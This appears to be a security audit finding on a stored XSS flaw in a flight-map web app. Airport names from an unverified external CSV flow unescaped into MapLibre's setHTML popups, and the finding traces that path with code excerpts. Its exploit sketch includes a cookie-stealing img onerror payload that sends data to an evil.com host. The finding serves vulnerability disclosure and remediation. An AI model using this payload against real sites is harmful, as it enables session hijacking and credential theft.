---
Phase: 2
Sequence: 001
Slug: maplibre-sethtml-xss-via-airport-name
Verdict: VALID
Severity-Original: HIGH
Confidence: medium
Anchor: apps/web/src/lib/airports.ts
Anchor-Sha8: b1b2b937
---

## Summary

The `airportName()` function exported from the anchor file returns unsanitized airport names from the database. In `lib/components/FlightMap.svelte:124-125`, the returned name is injected into raw HTML via MapLibre GL's `.setHTML()` method without any sanitization. Airport names originate from an external CSV file (`ourairports-data`) fetched over HTTPS without integrity verification. A compromised upstream data source or MITM attacker could inject XSS payloads into airport names, which would execute in users' browsers when they open the map popup on a flight involving that airport.

## Location

- `apps/web/src/lib/airports.ts:18-27` — `airportName()` returns unsanitized airport name from store
- `apps/web/src/lib/components/FlightMap.svelte:124-125` — `.setHTML()` injects airport name into raw HTML
- `apps/weather-service/src/airports.ts:18-19` — fetches airport data from external CSV without integrity check
- `apps/weather-service/src/airports.ts:116` — inserts airport data into database without sanitization
- `apps/web/src/routes/+layout.server.ts:20-36` — loads airport data from DB into layout data (no sanitization)

## Attacker Control

The attacker controls airport names by compromising the upstream data source:
1. The `ourairports-data` GitHub repository (`https://raw.githubusercontent.com/davidmegginson/ourairports-data/main/airports.csv`)
2. Network path (MITM if TLS is bypassed)

No integrity verification (SRI hash, GPG signature, or checksum) is performed on the fetched CSV data. Airport names pass through the entire pipeline — CSV → database → Svelte store → `.setHTML()` — without any sanitization or escaping.

## Trust Boundary Crossed

External data (third-party CSV from GitHub) crosses into the browser's DOM execution context without sanitization. The data flows:
1. External HTTP source → database (trusted storage)
2. Database → server-side layout load (trusted server)
3. Server → client-side Svelte store (data crosses to client)
4. Svelte store → `airportName()` → `.setHTML()` (unsanitized data reaches DOM as HTML)

## Impact

Stored XSS: arbitrary JavaScript execution in the context of airways.gg when a user opens a MapLibre GL popup for any flight involving a compromised airport. This allows session hijacking, credential theft, DOM manipulation, and phishing attacks targeting airways.gg users.

## Evidence

**1. Airport data sourced from external CSV without integrity verification** (`apps/weather-service/src/airports.ts:18-19`):
```typescript
const OURAIRPORTS_URL = 'https://raw.githubusercontent.com/davidmegginson/ourairports-data/main/airports.csv';

async function fetchOurAirportsData(): Promise<Map<string, ...>> {
  const res = await fetch(OURAIRPORTS_URL);
```

**2. CSV parsing — no sanitization of airport name** (`apps/weather-service/src/airports.ts:86-90`):
```typescript
results.set(iata, {
  icao,
  name: fields[nameIndex] || `${iata} Airport`,  // raw CSV value, no sanitization
  city: fields[cityIndex] || null,
  ...
});
```

**3. Database upsert — raw name inserted** (`apps/weather-service/src/airports.ts:116-119`):
```typescript
await db.insert(airports)
  .values(values)
  .onConflictDoUpdate({ target: airports.iataCode, set: { ... } });
```

**4. Server layout load — airports fetched without sanitization** (`apps/web/src/routes/+layout.server.ts:29-36`):
```typescript
const rows = await db
  .select({ ... airports.name ... })
  .from(airports);
const data = Object.fromEntries(rows.map(a => [a.iataCode, a]));
```

**5. `airportName()` returns raw name** (`apps/web/src/lib/airports.ts:18-27`):
```typescript
export function airportName(iata: string): string {
  let name = iata;
  const unsub = airportsStore.subscribe(a => {
    const airport = a[iata];
    name = airport?.name ?? iata;  // unsanitized DB value returned directly
  });
  unsub();
  return name;
}
```

**6. Raw HTML injection via `.setHTML()`** (`apps/web/src/lib/components/FlightMap.svelte:124-125`):
```typescript
planeMarker = new maplibregl.Marker({ element: planeEl, anchor: 'center' })
  .setLngLat(aircraftCoords)
  .setPopup(
    new maplibregl.Popup().setHTML(
      `<b>${airportName(depAirport)} (${depAirport}) → ${airportName(arrAirport)} (${arrAirport})</b><br>${lat.toFixed(4)}, ${lon.toFixed(4)}`
    )
  )
```

MapLibre GL's `.setHTML()` sets the popup content as raw innerHTML — no escaping is applied.

**7. Contrast with `.setText()` which IS safe** (`FlightMap.svelte:103`):
```typescript
.setPopup(new maplibregl.Popup().setText(`${airportName(depAirport)} (${depAirport})`))
```

The airport marker popups on lines 103 and 108 use `.setText()` (auto-escaped), but the aircraft marker popup on line 124 uses `.setHTML()` (raw HTML — vulnerable).

## Exploit Sketch

1. Attacker compromises the `davidmegginson/ourairports-data` repository or performs MITM on the fetch to `raw.githubusercontent.com`
2. Attacker modifies an airport name in the CSV to: `<img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)>` for a commonly-used airport (e.g., `LHR`, `JFK`)
3. The `weather-service`'s `syncAirports()` fetches and upserts the poisoned CSV into the database
4. The `airways.gg` web app loads the poisoned airport data via `+layout.server.ts` → `initAirports()`
5. When a user views a flight involving the compromised airport on a page with the FlightMap component, and clicks the aircraft marker to open the popup, the XSS payload executes
6. Attacker receives session cookies / auth tokens

## Open Questions

- Does the `ourairports-data` repository have any commit signing or verification that could be checked? (Current code performs no verification.)
- Are there any WAF/CSP protections on airways.gg that would mitigate the XSS execution? (Not verified.)
- The airport `name` column is `varchar(255)` — likely sufficient for XSS payloads.
- Could a non-MITM attacker poison the data by opening a malicious PR against the `ourairports-data` repo? The CSV parser only accepts IATA codes of exactly 3 characters, limiting which airports could be targeted.
